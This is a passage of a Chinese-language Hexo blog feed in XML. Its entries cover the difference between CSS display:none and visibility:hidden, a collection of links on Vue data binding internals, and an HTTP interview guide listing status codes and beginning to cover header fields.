nofollow noopener noreferrer" target="_blank">聊聊 JavaScript 与浏览器的那些事 - 引擎与线程</a></li><li><a href="https://www.kancloud.cn/xiak/quanduan/375582" rel="external nofollow noopener noreferrer" target="_blank">js 引擎与 GUI 引擎是互斥的</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://juejin.im/entry/596d78ee6fb9a06bb752475c&quot; rel=&quot;external nofollow noopener noreferrer&quot; target=&quot;_blank&quot;&gt;深入探究 eventlo
      
    
    </summary>
    
      <category term="技术研究" scheme="https://hexo.bangz.me/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="javascript" scheme="https://hexo.bangz.me/tags/javascript/"/>
    
      <category term="前端" scheme="https://hexo.bangz.me/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="ECMAScript" scheme="https://hexo.bangz.me/tags/ECMAScript/"/>
    
  </entry>
  
  <entry>
    <title>display: none 和 visibility: hidden 的区别</title>
    <link href="https://hexo.bangz.me/archives/difference-between-display-none-and-visibility-hidden.html"/>
    <id>https://hexo.bangz.me/archives/difference-between-display-none-and-visibility-hidden.html</id>
    <published>2018-07-10T06:37:56.000Z</published>
    <updated>2018-08-07T09:09:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>display:none 和 visibility: hidden 都是 CSS 中用于隐藏元素的属性，但他们在具体的场景上还是有一些区别：</p><h2 id="1-继承属性的差异"><a href="#1-继承属性的差异" class="headerlink" title="1. 继承属性的差异"></a>1. 继承属性的差异</h2><ul><li>display: none 是非继承属性，一旦设置后，就算修改其子元素 display 属性的值也不会显示。</li><li>visibility: hidden 是继承属性，其子节点会继承 visibility 属性的值，若修改其子节点的 visibility 为 visibile，则子节点会重新显示</li></ul><a id="more"></a><h2 id="2-是否占据渲染空间"><a href="#2-是否占据渲染空间" class="headerlink" title="2. 是否占据渲染空间"></a>2. 是否占据渲染空间</h2><ul><li>display: none 仅会存在于 DOM 树中，并不存在于渲染树中，不会占据渲染空间</li><li>visibility: hidden 既存在于 DOM 树中，也存在于渲染树中，会占据渲染空间</li></ul><h2 id="3-修改属性所导致的重绘"><a href="#3-修改属性所导致的重绘" class="headerlink" title="3. 修改属性所导致的重绘"></a>3. 修改属性所导致的重绘</h2><ul><li>修改 display 属性的值会导致文档重排 (reflow)，重新计算样式并生成渲染树</li><li>修改 visibility 属性的值仅会产生局部重绘 (repaint)，不需要重新生成渲染树</li></ul><p>参考资料：</p><ul><li><a href="https://stackoverflow.com/questions/27637184/what-is-dom-reflow/27637245#27637245" rel="external nofollow noopener noreferrer" target="_blank">What is DOM reflow?</a></li><li><a href="https://gist.github.com/paulirish/5d52fb081b3570c81e3a" rel="external nofollow noopener noreferrer" target="_blank">What forces layout / reflow</a></li><li><a href="https://blog.csdn.net/crystal6918/article/details/77017487" rel="external nofollow noopener noreferrer" target="_blank">display: none; 与 visibility: hidden; 的区别</a></li><li><a href="https://juejin.im/post/5ad815df6fb9a045cb6d1fb4" rel="external nofollow noopener noreferrer" target="_blank">回流、重绘及其优化</a></li><li><a href="https://juejin.im/post/5ae977da518825673446d92d" rel="external nofollow noopener noreferrer" target="_blank">浏览器中的回流，重绘</a></li><li><a href="https://div.io/topic/767" rel="external nofollow noopener noreferrer" target="_blank">百万数据如何在前端快速流畅显示？</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;display:none 和 visibility: hidden 都是 CSS 中用于隐藏元素的属性，但他们在具体的场景上还是有一些区别：&lt;/p&gt;
&lt;h2 id=&quot;1-继承属性的差异&quot;&gt;&lt;a href=&quot;#1-继承属性的差异&quot; class=&quot;headerlink&quot; title=&quot;1. 继承属性的差异&quot;&gt;&lt;/a&gt;1. 继承属性的差异&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;display: none 是非继承属性，一旦设置后，就算修改其子元素 display 属性的值也不会显示。&lt;/li&gt;
&lt;li&gt;visibility: hidden 是继承属性，其子节点会继承 visibility 属性的值，若修改其子节点的 visibility 为 visibile，则子节点会重新显示&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="技术研究" scheme="https://hexo.bangz.me/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="CSS3" scheme="https://hexo.bangz.me/tags/CSS3/"/>
    
      <category term="javascript" scheme="https://hexo.bangz.me/tags/javascript/"/>
    
      <category term="前端" scheme="https://hexo.bangz.me/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>Vue 数据驱动原理教程链接集合</title>
    <link href="https://hexo.bangz.me/archives/vue-data-driving-tutorial-links.html"/>
    <id>https://hexo.bangz.me/archives/vue-data-driving-tutorial-links.html</id>
    <published>2018-07-10T04:34:05.000Z</published>
    <updated>2018-07-10T08:00:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>文档：</p><ul><li><a href="https://github.com/ustbhuangyi/vue-analysis" rel="external nofollow noopener noreferrer" target="_blank">Vue 技术揭秘</a></li><li><a href="https://github.com/DMQ/mvvm" rel="external nofollow noopener noreferrer" target="_blank">剖析 Vue 实现原理 - 如何实现双向绑定 mvvm</a></li></ul><a id="more"></a><p>监听数据变化：</p><ul><li><a href="https://www.jianshu.com/p/a86a9a377c85" rel="external nofollow noopener noreferrer" target="_blank">VUE2.0 如何追踪数据变化？</a></li><li><a href="https://www.jianshu.com/p/311bb4541336" rel="external nofollow noopener noreferrer" target="_blank">Vue 源码学习之一：监听数据对象变化</a></li></ul><p>实现从 VDOM 到 DOM：</p><ul><li><a href="https://github.com/DDFE/DDFE-blog/issues/18" rel="external nofollow noopener noreferrer" target="_blank">Vue 2.0 的 virtual-dom 实现简析</a></li><li><p><a href="http://hcysun.me/2017/03/03/Vue%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/?nsukey=uNLdASBFj%2FX10MlVD2RJX77Wnt13nx%2FH6ZVE1t65sDrd02q9RSH6MjRyIoAYE9jBDbkUWtjTlTEDKaox7OTe%2FrjTXOZNHNQ%2Fhbuptv0Gh%2BTnPWuM6Gz23NfBcXVHH98iRRWmVzvD4S64LQ37%2BspyYUVNC9%2Bzt7UOB3145ltgz5k%3D#%E6%B3%A8%E9%87%8D%E5%A4%A7%E4%BD%93%E6%A1%86%E6%9E%B6%EF%BC%8C%E4%BB%8E%E5%AE%8F%E8%A7%82%E5%88%B0%E5%BE%AE%E8%A7%82" rel="external nofollow noopener noreferrer" target="_blank">Vue2.1.7 源码学习</a></p><p>  一、createElement(): 用 JavaScript 对象 (虚拟树) 描述 真实 DOM 对象 (真实树)<br><br>  二、diff(oldNode, newNode) : 对比新旧两个虚拟树的区别，收集差异 &lt; br&gt;<br>  三、patch() : 将差异应用到真实 DOM 树</p></li></ul><p>监听 DOM 表单元素变化：</p><ul><li><a href="https://www.cnblogs.com/kidney/p/6052935.html" rel="external nofollow noopener noreferrer" target="_blank">Vue.js 双向绑定的实现原理</a></li><li><a href="https://www.cnblogs.com/Eden-cola/p/vue-v-model-with-input.html" rel="external nofollow noopener noreferrer" target="_blank">从 vue.js 的源码分析，input 和 textarea 上的 v-model 指令到底做了什么</a></li></ul><p>其他：</p><ul><li><a href="https://segmentfault.com/a/1190000008261449" rel="external nofollow noopener noreferrer" target="_blank">vue2 实现 div contenteditable=”true” 类似于 v-model 的效果</a></li><li><a href="https://segmentfault.com/a/1190000007662815" rel="external nofollow noopener noreferrer" target="_blank"><br>如何理解 v-model 就是语法糖？</a></li><li><a href="https://www.jianshu.com/p/4147d3ed2e60" rel="external nofollow noopener noreferrer" target="_blank">Vue 进阶教程之：详解 v-model</a></li><li><a href="https://hijiangtao.github.io/2017/08/03/How-to-Manipulate-DOM-Effectively/" rel="external nofollow noopener noreferrer" target="_blank">如何监听页面 DOM 变动并高效响应（事件委托）</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文档：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/ustbhuangyi/vue-analysis&quot; rel=&quot;external nofollow noopener noreferrer&quot; target=&quot;_blank&quot;&gt;Vue 技术揭秘&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/DMQ/mvvm&quot; rel=&quot;external nofollow noopener noreferrer&quot; target=&quot;_blank&quot;&gt;剖析 Vue 实现原理 - 如何实现双向绑定 mvvm&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="技术研究" scheme="https://hexo.bangz.me/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="javascript" scheme="https://hexo.bangz.me/tags/javascript/"/>
    
      <category term="前端" scheme="https://hexo.bangz.me/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="Vue" scheme="https://hexo.bangz.me/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>HTTP 面试指南</title>
    <link href="https://hexo.bangz.me/archives/http-quick-guide.html"/>
    <id>https://hexo.bangz.me/archives/http-quick-guide.html</id>
    <published>2018-07-03T02:34:52.000Z</published>
    <updated>2018-07-13T11:41:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTTP-状态码"><a href="#HTTP-状态码" class="headerlink" title="HTTP 状态码"></a>HTTP 状态码</h1><p>HTTP 状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型，后两个数字没有分类的作用。HTTP 状态码共分为 5 种类型：</p><ul><li>1xx    信息，服务器收到请求，需要请求者继续执行操作</li><li>2xx    成功，操作被成功接收并处理</li><li>3xx    重定向，需要进一步的操作以完成请求</li><li>4xx    客户端错误，请求包含语法错误或无法完成请求</li><li>5xx    服务器错误，服务器在处理请求的过程中发生了错误</li></ul><a id="more"></a><h2 id="完整的-HTTP-状态码表"><a href="#完整的-HTTP-状态码表" class="headerlink" title="完整的 HTTP 状态码表"></a>完整的 HTTP 状态码表</h2><h3 id="1xx-————-信息状态码"><a href="#1xx-————-信息状态码" class="headerlink" title="1xx ———— 信息状态码"></a>1xx ———— 信息状态码</h3><table><thead><tr><th>状态码</th><th>状态名</th><th>状态描述</th></tr></thead><tbody><tr><td>100</td><td>Continue</td><td>服务器已经接收到请求头，并且客户端应继续发送请求主体（在需要发送身体的请求的情况下：例如，POST 请求），或者如果请求已经完成，忽略这个响应。服务器必须在请求完成后向客户端发送一个最终响应。要使服务器检查请求的头部，客户端必须在其初始请求中发送 Expect: 100-continue 作为头部，并在发送正文之前接收 100 Continue 状态代码。响应代码 417 期望失败表示请求不应继续。</td></tr><tr><td>101</td><td>Switching Protocols</td><td>服务器已经理解了客户端的请求，并将通过 Upgrade 消息头通知客户端采用不同的协议来完成这个请求。在发送完这个响应最后的空行后，服务器将会切换到在 Upgrade 消息头中定义的那些协议。<br> 只有在切换新的协议更有好处的时候才应该采取类似措施。例如，切换到新的 HTTP 版本（如 HTTP/2）比旧版本更有优势，或者切换到一个实时且同步的协议（如 WebSocket）以传送利用此类特性的资源。</td></tr><tr><td>102</td><td>Processing</td><td>WebDAV 请求可能包含许多涉及文件操作的子请求，需要很长时间才能完成请求。该代码表示​​服务器已经收到并正在处理请求，但无响应可用。这样可以防止客户端超时，并假设请求丢失。</td></tr></tbody></table><h3 id="2xx-————-成功状态码"><a href="#2xx-————-成功状态码" class="headerlink" title="2xx ———— 成功状态码"></a>2xx ———— 成功状态码</h3><table><thead><tr><th>状态码</th><th>状态名</th><th>状态描述</th></tr></thead><tbody><tr><td>200</td><td>OK</td><td>请求已成功，请求所希望的响应头或数据体将随此响应返回。实际的响应将取决于所使用的请求方法。在 GET 请求中，响应将包含与请求的资源相对应的实体。在 POST 请求中，响应将包含描述或操作结果的实体。</td></tr><tr><td>201</td><td>Created</td><td>请求已经被实现，而且有一个新的资源已经依据请求的需要而创建，且其 URI 已经随 Location 头信息返回。假如需要的资源无法及时创建的话，应当返回’202 Accepted’。</td></tr><tr><td>202</td><td>Accepted</td><td>服务器已接受请求，但尚未处理。最终该请求可能会也可能不会被执行，并且可能在处理发生时被禁止。</td></tr><tr><td>203</td><td>Non-Authoritative Information</td><td>服务器是一个转换代理服务器（transforming proxy，例如网络加速器），以 200 OK 状态码为起源，但回应了原始响应的修改版本。</td></tr><tr><td>204</td><td>No Content</td><td>服务器成功处理了请求，没有返回任何内容。</td></tr><tr><td>205</td><td>Reset Content</td><td>服务器成功处理了请求，但没有返回任何内容。与 204 响应不同，此响应要求请求者重置文档视图。</td></tr><tr><td>206</td><td>Partial Content</td><td>服务器已经成功处理了部分 GET 请求。类似于 FlashGet 或者迅雷这类的 HTTP 下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。</td></tr><tr><td>207</td><td>Multi-Status</td><td>代表之后的消息体将是一个 XML 消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。</td></tr><tr><td>208</td><td>Already Reported</td><td>DAV 绑定的成员已经在（多状态）响应之前的部分被列举，且未被再次包含。</td></tr><tr><td>226</td><td>IM Used</td><td>服务器已经满足了对资源的请求，对实体请求的一个或多个实体操作的结果表示。</td></tr></tbody></table><h3 id="3xx-————-重定向状态码"><a href="#3xx-————-重定向状态码" class="headerlink" title="3xx ———— 重定向状态码"></a>3xx ———— 重定向状态码</h3><table><thead><tr><th>状态码</th><th>状态名</th><th>状态描述</th></tr></thead><tbody><tr><td>300</td><td>Multiple Choices</td><td>被请求的资源有一系列可供选择的回馈信息，每个都有自己特定的地址和浏览器驱动的商议信息。用户或浏览器能够自行选择一个首选的地址进行重定向。<br> 除非这是一个 HEAD 请求，否则该响应应当包括一个资源特性及地址的列表的实体，以便用户或浏览器从中选择最合适的重定向地址。这个实体的格式由 Content-Type 定义的格式所决定。浏览器可能根据响应的格式以及浏览器自身能力，自动作出最合适的选择。当然，RFC 2616 规范并没有规定这样的自动选择该如何进行。<br> 如果服务器本身已经有了首选的回馈选择，那么在 Location 中应当指明这个回馈的 URI；浏览器可能会将这个 Location 值作为自动重定向的地址。此外，除非额外指定，否则这个响应也是可缓存的。</td></tr><tr><td>301</td><td>Moved Permanently</td><td>被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个 URI 之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定，否则这个响应也是可缓存的。<br> 新的永久性的 URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明。<br> 如果这不是一个 GET 或者 HEAD 请求，因此浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。<br> 注意：对于某些使用 HTTP/1.0 协议的浏览器，当它们发送的 POST 请求得到了一个 301 响应的话，接下来的重定向请求将会变成 GET 方式。</td></tr><tr><td>302</td><td>Found</td><td>要求客户端执行临时重定向（原始描述短语为“Moved Temporarily”）。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在 Cache-Control 或 Expires 中进行了指定的情况下，这个响应才是可缓存的。<br> 新的临时性的 URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明。<br> 如果这不是一个 GET 或者 HEAD 请求，那么浏览器禁止自动进行重定向，除非得到用户的确认，因为请求的条件可能因此发生变化。<br> 注意：虽然 RFC 1945 和 RFC 2068 规范不允许客户端在重定向时改变请求的方法，但是很多现存的浏览器将 302 响应视作为 303 响应，并且使用 GET 方式访问在 Location 中规定的 URI，而无视原先请求的方法。因此状态码 303 和 307 被添加了进来，用以明确服务器期待客户端进行何种反应。</td></tr><tr><td>303</td><td>See Other</td><td>对应当前请求的响应可以在另一个 URI 上被找到，当响应于 POST（或 PUT / DELETE）接收到响应时，客户端应该假定服务器已经收到数据，并且应该使用单独的 GET 消息发出重定向。这个方法的存在主要是为了允许由脚本激活的 POST 请求输出重定向到一个新的资源。这个新的 URI 不是原始资源的替代引用。同时，303 响应禁止被缓存。当然，第二个请求（重定向）可能被缓存。<br> 新的 URI 应当在响应的 Location 域中返回。除非这是一个 HEAD 请求，否则响应的实体中应当包含指向新的 URI 的超链接及简短说明。<br> 注意：许多 HTTP/1.1 版以前的浏览器不能正确理解 303 状态。如果需要考虑与这些浏览器之间的互动，302 状态码应该可以胜任，因为大多数的浏览器处理 302 响应时的方式恰恰就是上述规范要求客户端处理 303 响应时应当做的。</td></tr><tr><td>304</td><td>Not Modified</td><td>表示资源未被修改，因为请求头指定的版本 If-Modified-Since 或 If-None-Match。在这种情况下，由于客户端仍然具有以前下载的副本，因此不需要重新传输资源。</td></tr><tr><td>305</td><td>Use Proxy</td><td>被请求的资源必须通过指定的代理才能被访问。Location 域中将给出指定的代理所在的 URI 信息，接收者需要重复发送一个单独的请求，通过这个代理才能访问相应资源。只有原始服务器才能创建 305 响应。许多 HTTP 客户端（像是 Mozilla 和 Internet Explorer）都没有正确处理这种状态代码的响应，主要是出于安全考虑。<br> 注意：RFC 2068 中没有明确 305 响应是为了重定向一个单独的请求，而且只能被原始服务器建立。忽视这些限制可能导致严重的安全后果。</td></tr><tr><td>306</td><td>Switch Proxy</td><td>在最新版的规范中，306 状态码已经不再被使用。最初是指“后续请求应使用指定的代理”。</td></tr><tr><td>307</td><td>Temporary Redirect</td><td>在这种情况下，请求应该与另一个 URI 重复，但后续的请求应仍使用原始的 URI。 与 302 相反，当重新发出原始请求时，不允许更改请求方法。 例如，应该使用另一个 POST 请求来重复 POST 请求。</td></tr><tr><td>308</td><td>Permanent Redirect</td><td>请求和所有将来的请求应该使用另一个 URI 重复。 307 和 308 重复 302 和 301 的行为，但不允许 HTTP 方法更改。 例如，将表单提交给永久重定向的资源可能会顺利进行。</td></tr></tbody></table><h3 id="4xx-————-客户端错误状态码"><a href="#4xx-————-客户端错误状态码" class="headerlink" title="4xx ———— 客户端错误状态码"></a>4xx ———— 客户端错误状态码</h3><table><thead><tr><th>状态码</th><th>状态名</th><th>状态描述</th></tr></thead><tbody><tr><td>400</td><td>Bad Request</td><td>由于明显的客户端错误（例如，格式错误的请求语法，太大的大小，无效的请求消息或欺骗性路由请求），服务器不能或不会处理该请求。</td></tr><tr><td>401</td><td>Unauthorized</td><td>类似于 403 Forbidden，401 语义即“未认证”，即用户没有必要的凭据。该状态码表示当前请求需要用户验证。该响应必须包含一个适用于被请求资源的 WWW-Authenticate 信息头用以询问用户信息。客户端可以重复提交一个包含恰当的 Authorization 头信息的请求。如果当前请求已经包含了 Authorization 证书，那么 401 响应代表着服务器验证已经拒绝了那些证书。如果 401 响应包含了与前一个响应相同的身份验证询问，且浏览器已经至少尝试了一次验证，那么浏览器应当向用户展示响应中包含的实体信息，因为这个实体信息中可能包含了相关诊断信息。 <br> 注意：当网站（通常是网站域名）禁止 IP 地址时，有些网站状态码显示的 401，表示该特定地址被拒绝访问网站。</td></tr><tr><td>402</td><td>Payment Required</td><td>该状态码是为了将来可能的需求而预留的。该状态码最初的意图可能被用作某种形式的数字现金或在线支付方案的一部分，但几乎没有哪家服务商使用，而且这个状态码通常不被使用。如果特定开发人员已超过请求的每日限制，Google Developers API 会使用此状态码。</td></tr><tr><td>403</td><td>Forbidden</td><td>服务器已经理解请求，但是拒绝执行它。与 401 响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个 HEAD 请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个 404 响应，假如它不希望让客户端获得任何信息。</td></tr><tr><td>404</td><td>Not Found</td><td>请求失败，请求所希望得到的资源未被在服务器上发现，但允许用户的后续请求。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用 410 状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址。404 这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下。</td></tr><tr><td>405</td><td>Method Not Allowed</td><td>请求行中指定的请求方法不能被用于请求相应的资源。该响应必须返回一个 Allow 头信息用以表示出当前资源能够接受的请求方法的列表。例如，需要通过 POST 呈现数据的表单上的 GET 请求，或只读资源上的 PUT 请求。<br> 鉴于 PUT，DELETE 方法会对服务器上的资源进行写操作，因而绝大部分的网页服务器都不支持或者在默认配置下不允许上述请求方法，对于此类请求均会返回 405 错误。</td></tr><tr><td>406</td><td>Not Acceptable</td><td>请求的资源的内容特性无法满足请求头中的条件，因而无法生成响应实体，该请求不可接受。<br> 除非这是一个 HEAD 请求，否则该响应就应当返回一个包含可以让用户或者浏览器从中选择最合适的实体特性以及地址列表的实体。实体的格式由 Content-Type 头中定义的媒体类型决定。浏览器可以根据格式及自身能力自行作出最佳选择。但是，规范中并没有定义任何作出此类自动选择的标准。</td></tr><tr><td>407</td><td>Proxy Authentication Required</td><td>与 401 响应类似，只不过客户端必须在代理服务器上进行身份验证。代理服务器必须返回一个 Proxy-Authenticate 用以进行身份询问。客户端可以返回一个 Proxy-Authorization 信息头用以验证。</td></tr><tr><td>408</td><td>Request Timeout</td><td>请求超时。根据 HTTP 规范，客户端没有在服务器预备等待的时间内完成一个请求的发送，客户端可以随时再次提交这一请求而无需进行任何更改。</td></tr><tr><td>409</td><td>Conflict</td><td>表示因为请求存在冲突无法处理该请求，例如多个同步更新之间的编辑冲突。</td></tr><tr><td>410</td><td>Gone</td><td>表示所请求的资源不再可用，将不再可用。当资源被有意地删除并且资源应被清除时，应该使用这个。在收到 410 状态码后，用户应停止再次请求资源。但大多数服务端不会使用此状态码，而是直接使用 404 状态码。</td></tr><tr><td>411</td><td>Length Required</td><td>服务器拒绝在没有定义 Content-Length 头的情况下接受请求。在添加了表明请求消息体长度的有效 Content-Length 头之后，客户端可以再次提交该请求。</td></tr><tr><td>412</td><td>Precondition Failed</td><td>服务器在验证在请求的头字段中给出先决条件时，没能满足其中的一个或多个。这个状态码允许客户端在获取资源时在请求的元信息（请求头字段数据）中设置先决条件，以此避免该请求方法被应用到其希望的内容以外的资源上。</td></tr><tr><td>413</td><td>Request Entity Too Large</td><td>前称“Request Entity Too Large”，表示服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。此种情况下，服务器可以关闭连接以免客户端继续发送此请求。<br> 如果这个状况是临时的，服务器应当返回一个 Retry-After 的响应头，以告知客户端可以在多少时间以后重新尝试。</td></tr><tr><td>414</td><td>Request-URI Too Long</td><td>前称“Request-URI Too Long”，表示请求的 URI 长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。通常将太多数据的结果编码为 GET 请求的查询字符串，在这种情况下，应将其转换为 POST 请求。这比较少见，通常的情况包括：<br> 本应使用 POST 方法的表单提交变成了 GET 方法，导致查询字符串过长。<br> 重定向 URI“黑洞”，例如每次重定向把旧的 URI 作为新的 URI 的一部分，导致在若干次重定向后 URI 超长。<br> 客户端正在尝试利用某些服务器中存在的安全漏洞攻击服务器。这类服务器使用固定长度的缓冲读取或操作请求的 URI，当 GET 后的参数超过某个数值后，可能会产生缓冲区溢出，导致任意代码被执行。没有此类漏洞的服务器，应当返回 414 状态码。</td></tr><tr><td>415</td><td>Unsupported Media Type</td><td>对于当前请求的方法和所请求的资源，请求中提交的互联网媒体类型并不是服务器中所支持的格式，因此请求被拒绝。例如，客户端将图像上传格式为 svg，但服务器要求图像使用上传格式为 jpg。</td></tr><tr><td>416</td><td>Requested Range Not Satisfiable</td><td>前称“Requested Range Not Satisfiable”。客户端已经要求文件的一部分（Byte serving），但服务器不能提供该部分。例如，如果客户端要求文件的一部分超出文件尾端。</td></tr><tr><td>417</td><td>Expectation Failed</td><td>在请求头 Expect 中指定的预期内容无法被服务器满足，或者这个服务器是一个代理服显的证据证明在当前路由的下一个节点上，Expect 的内容无法被满足。</td></tr><tr><td>418</td><td>I’m a teapot</td><td>本操作码是在 1998 年作为 IETF 的传统愚人节笑话, 在 RFC 2324 超文本咖啡壶控制协议’中定义的，并不需要在真实的 HTTP 服务器中定义。当一个控制茶壶的 HTCPCP 收到 BREW 或 POST 指令要求其煮咖啡时应当回传此错误。这个 HTTP 状态码在某些网站（包括 Google.com）与项目（如 Node.js、ASP.NET 和 Go 语言）中用作彩蛋。</td></tr><tr><td>420</td><td>Enhance Your Caim</td><td>Twitter Search 与 Trends API 在客户端被限速的情况下返回。</td></tr><tr><td>421</td><td>Misdirected Request</td><td>该请求针对的是无法产生响应的服务器（例如因为连接重用）。</td></tr><tr><td>422</td><td>Unprocessable Entity</td><td>请求格式正确，但是由于含有语义错误，无法响应。</td></tr><tr><td>423</td><td>Locked</td><td>当前资源被锁定。</td></tr><tr><td>424</td><td>Failed Dependency</td><td>由于之前的某个请求发生的错误，导致当前请求失败，例如 PROPPATCH。</td></tr><tr><td>425</td><td>Unordered Collection</td><td>在 WebDAV Advanced Collections Protocol 中定义，但 Web Distributed Authoring and Versioning (WebDAV) Ordered Collections Protocol 中并不存在。</td></tr><tr><td>426</td><td>Upgrade Required</td><td>客户端应当切换到 TLS/1.0，并在 HTTP/1.1 Upgrade header 中给出。</td></tr><tr><td>428</td><td>Precondition Required</td><td>原服务器要求该请求满足一定条件。这是为了防止“‘未更新’问题，即客户端读取（GET）一个资源的状态，更改它，并将它写（PUT）回服务器，但这期间第三方已经在服务器上更改了该资源的状态，因此导致了冲突。”</td></tr><tr><td>429</td><td>Too Many Requests</td><td>用户在给定的时间内发送了太多的请求。旨在用于网络限速。</td></tr><tr><td>431</td><td>Request Header Fields Too Large</td><td>服务器不愿处理请求，因为一个或多个头字段过大。</td></tr><tr><td>444</td><td>No Response</td><td>Nginx 上 HTTP 服务器扩展。服务器不向客户端返回任何信息，并关闭连接（有助于阻止恶意软件）。</td></tr><tr><td>450</td><td>Blocked by Windows Parental Controls</td><td>这是一个由 Windows 家庭控制（Microsoft）HTTP 阻止的 450 状态代码的示例，用于信息和测试。</td></tr><tr><td>451</td><td>Unavailable For Legal Reasons</td><td>该访问因法律的要求而被拒绝，由 IETF 在 2015 核准后新增加。</td></tr><tr><td>494</td><td>Request Header Too Large</td><td>在错误代码 431 提出之前 Nginx 上使用的扩展 HTTP 代码。</td></tr></tbody></table><h3 id="5xx-————-服务器错误状态码"><a href="#5xx-————-服务器错误状态码" class="headerlink" title="5xx ———— 服务器错误状态码"></a>5xx ———— 服务器错误状态码</h3><table><thead><tr><th>状态码</th><th>状态名</th><th>状态描述</th></tr></thead><tbody><tr><td>500</td><td>Internal Server Error</td><td>通用错误消息，服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。没有给出具体错误信息。</td></tr><tr><td>501</td><td>Not Implemented</td><td>服务器不支持当前请求所需要的某个功能。当服务器无法识别请求的方法，并且无法支持其对任何资源的请求。（例如，网络服务 API 的新功能）</td></tr><tr><td>502</td><td>Bad Gateway</td><td>作为网关或者代理工作的服务器尝试执行请求时，从上游服务器接收到无效的响应。</td></tr><tr><td>503</td><td>Service Unavailable</td><td>由于临时的服务器维护或者过载，服务器当前无法处理请求。这个状况是暂时的，并且将在一段时间以后恢复。如果能够预计延迟时间，那么响应中可以包含一个 Retry-After 头用以标明这个延迟时间。如果没有给出这个 Retry-After 信息，那么客户端应当以处理 500 响应的方式处理它。</td></tr><tr><td>504</td><td>Gateway Timeout</td><td>作为网关或者代理工作的服务器尝试执行请求时，未能及时从上游服务器（URI 标识出的服务器，例如 HTTP、FTP、LDAP）或者辅助服务器（例如 DNS）收到响应。<br> 注意：某些代理服务器在 DNS 查询超时时会返回 400 或者 500 错误。</td></tr><tr><td>505</td><td>HTTP Version Not Supported</td><td>服务器不支持，或者拒绝支持在请求中使用的 HTTP 版本。这暗示着服务器不能或不愿使用与客户端相同的版本。响应中应当包含一个描述了为何版本不被支持以及服务器支持哪些协议的实体。</td></tr><tr><td>506</td><td>Variant Also Negotiates</td><td>由《透明内容协商协议》（RFC 2295）扩展，代表服务器存在内部配置错误，被请求的协商变元资源被配置为在透明内容协商中使用自己，因此在一个协商处理中不是一个合适的重点。</td></tr><tr><td>507</td><td>Insufficient Storage</td><td>服务器无法存储完成请求所必须的内容。这个状况被认为是临时的。</td></tr><tr><td>508</td><td>Loop Detected</td><td>服务器在处理请求时陷入死循环。（可代替 208 状态码）</td></tr><tr><td>510</td><td>Not Extended</td><td>获取资源所需要的策略并没有被满足。</td></tr><tr><td>511</td><td>Network Authentication Required</td><td>客户端需要进行身份验证才能获得网络访问权限，旨在限制用户群访问特定网络。（例如连接 WiFi 热点时的强制网络门户）</td></tr></tbody></table><h1 id="HTTP-头部字段"><a href="#HTTP-头部字段" class="headerlink" title="HTTP 头部字段"></a>HTTP 头部字段</h1><p>HTTP 头字段根据实际用途被分为以下 4 种类型：</p><ul><li>通用头字段(英语：General Header Fields)</li><li>请求头字段(英语：Request Header Fields)</li><li>响应头字段(英语：Response Header Fields)</li><li>实体头字段(英语：Entity Header Fields)</li></ul><h2 id="HTTP-通用头字段"><a href="#HTTP-通用头字段" class="headerlink" title="HTTP 通用头字段"></a>HTTP 通用头字段</h2><h3 id="一、Cache-Control"><a href="#一、Cache-Control" class="headerlink" title="一、Cache-Control"></a>一、Cache-Control</h3><p>通过这个首部字段可以操作缓存的工作机制。它的参数是可选的，多个指令之间通过 “,” 分隔，例如：<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cache-Control</span>: private, max-age=0, 